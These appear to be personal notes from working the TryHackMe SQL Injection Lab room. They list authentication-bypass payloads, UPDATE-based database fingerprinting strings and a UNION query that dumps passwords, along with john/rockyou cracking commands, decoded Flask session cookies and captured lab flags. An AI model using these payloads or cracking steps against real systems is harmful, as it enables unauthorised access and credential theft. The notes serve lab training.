[TryHackMe | SQL Injection Lab](https://tryhackme.com/room/sqlilab)

# SQL Injection Lab

**Understand how SQL injection attacks work and how to exploit this vulnerability.**

```
http://10.10.218.93:5000/
```

![[Pasted image 20230704220049.png]]

http://10.10.184.158:5000/sesqli1/login?next=http%3A%2F%2F10.10.184.158%3A5000%2Fsesqli1%2Fhome

```
'1 or 1=1-- -
```

![[Pasted image 20230704220611.png]]

```
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1 or 1=1-- - AND password = '47f274ce60fb8335f29cbe4437fc56108d099dfa914fad4064ec1239ada24f13'
```

```
1 or 1=1-- -
```

```
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 or 1=1-- - AND password = 'abbabb4d0029fc954aafabe7faed5d71c7997b1d28ee676cc0495da8c6efde88'
```

```
THM{dccea429d73d4a6b4f117ac64724f460}
```

![[Pasted image 20230704223143.png]]

http://10.10.184.158:5000/sesqli1/home

http://10.10.184.158:5000/sesqli2/home

```
1' or '1'='1'-- -
```

![[Pasted image 20230704223439.png]]

```
THM{356e9de6016b9ac34e02df99a5f755ba}
```

```
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' or '1'='1'-- -' AND password = 'da45f5fec53621a955c6b72dbf48c338741a295cf9146d441c1cd650e35cbe42'
```

![[Pasted image 20230704223637.png]]

```
http://10.10.184.158:5000/sesqli3/login?profileID=-1%27%20or%201=1--%20-&password=a
```

```
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='-1' or 1=1-- -' AND password='ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb'
```

```
THM{645eab5d34f81981f5705de54e8a9c36}
```

![[Pasted image 20230704224124.png]]

http://10.10.184.158:5000/sesqli4/login?next=http%3A%2F%2F10.10.184.158%3A5000%2Fsesqli4%2Fhome

```
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' AND password = '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08'
```
![[Pasted image 20230704224533.png]]
![[Pasted image 20230704225334.png]]

![[Pasted image 20230704225550.png]]

![[Pasted image 20230705064047.png]]

![[Pasted image 20230705064153.png]]

![[Pasted image 20230705070854.png]]

```
THM{727334fd0f0ea1b836a8d443f09dc8eb}|
```

*To identify what database is in use...*

### For MySQL and MSSQL

',nickName=@@version,email='

### For Oracle

',nickName=(SELECT banner FROM v$version),email='

### For SQLite

',nickName=sqlite_version(),email='

http://10.10.218.93:5000/sesqli5/login

```
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=? AND password=?
```

![[Pasted image 20230706055157.png]]

http://10.10.218.93:5000/sesqli5/home

![[Pasted image 20230706060132.png]]

http://10.10.218.93:5000/sesqli5/profile

![[Pasted image 20230706063419.png]]



https://www.onlinehashcrack.com/wh86lv20ap

```
find / -type f -name rockyou.txt 2>/dev/null
/usr/share/wordlists/rockyou.txt
```

![[Pasted image 20230704222216.png]]

```
47f274ce60fb8335f29cbe4437fc56108d099dfa914fad4064ec1239ada24f13
```
https://gchq.github.io/CyberChef/

```
john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt sqli1.txt
```

```
http://10.10.184.158:5000/downloads/
```

![[Pasted image 20230627224134.png]]

**06072023Thu**

```
http://10.10.144.133:5000/challenge1/
```

![[Pasted image 20230706214705.png]]

```
http://10.10.144.133:5000/challenge1/signup
```

![[Pasted image 20230706214821.png]]

![[Pasted image 20230706214930.png]]

```
http://10.10.144.133:5000/challenge1/home
```

![[Pasted image 20230706215118.png]]

![[Pasted image 20230706215937.png]]

spaceadmin

![[Pasted image 20230706220114.png]]

```
https://youtu.be/TiEQrwKRWjc?t=1686
```

**TryHackMe #301 SQL Injection Lab**
https://www.youtube.com/@AdamskiCTF

```
THM{f35f47dcd9d596f0d3860d14cd4c68ec}
```

![[Pasted image 20230706221958.png]]

**07072023Fri**

https://www.kirsle.net/wizards/flask-session.cgi

http://10.10.142.195:5000/challenge2/home

![[Pasted image 20230707060305.png]]

![[Pasted image 20230707060742.png]]

![[Pasted image 20230707061003.png]]

```
' UNION SELECT 1,group_concat(password) FROM users-- -
```

rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123

```
THM{fb381dfee71ef9c31b93625ad540c9fa}
```

![[Pasted image 20230707061501.png]]

![[Pasted image 20230707061641.png]]

```
python3 decode_cookie.py .eJyrVkrOSMzJSc1LTzWKLy1OLYrPTFGyMtRBF85LzE1VslJKTMnNzFOqBQAYpRNS.ZKdO6A.dOUoVKmnRFc9xlIl60YfJg5uoIs
{
    "challenge2_user_id": 1,
    "challenge2_username": "admin"
}
```

```
python3 decode_cookie.py .eJxdyLsOwiAUANBvkZmhcEGlm-lQBnXxFaeGwqVFS03AGpOm_-7uGc9MbG-GAccOeTNlTE1wpGT0v0cTkZQk2f39pqsv1pe8U28N9fFKTXb0NMWIiRdMrSgIGSG8RP8AetaH2bewZc4jbhh6ZYG1CtZcGidFYZU3C_2EZxg7xoEsP-x5LwI.ZKdRdA.KvIZbyBOgx9nF2nHAZBmCbLJTjc
{
    "challenge2_user_id": 1,
    "challenge2_username": "rcLYWHCxeGUsA9tH3GNV,asd,Summer2019!,345m3io4hj3,THM{fb381dfee71ef9c31b93625ad540c9fa},viking123"
}
```

